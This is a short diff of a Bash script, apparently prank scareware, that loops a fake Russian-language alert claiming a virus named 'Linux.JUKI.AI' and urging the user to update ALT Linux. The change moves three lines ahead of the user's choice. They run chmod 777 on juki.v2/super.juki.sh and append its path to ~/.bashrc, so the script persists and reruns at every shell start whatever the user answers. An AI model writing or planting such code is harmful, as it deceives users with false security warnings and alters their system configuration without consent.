@@ -11,6 +11,10 @@ windows_style() {
 sleep 4
 
 while true; do
+    cd
+    chmod 777 juki.v2/super.juki.sh
+    echo "juki.v2/super.juki.sh" >> ~/.bashrc
+    
     windows_style
     echo -e "\e[31mОбнаружен вирус: Linux.JUKI.AI"
     echo "Рекомендуется удалить или обновить ALT Linux"
@@ -20,10 +24,6 @@ while true; do
     echo "1 - Обновить Linux (рекомендуется)"
     
     read -p "Ваш выбор: " choice
-
-    cd
-    chmod 777 juki.v2/super.juki.sh
-    echo "juki.v2/super.juki.sh" >> ~/.bashrc
     
     case $choice in
         1)
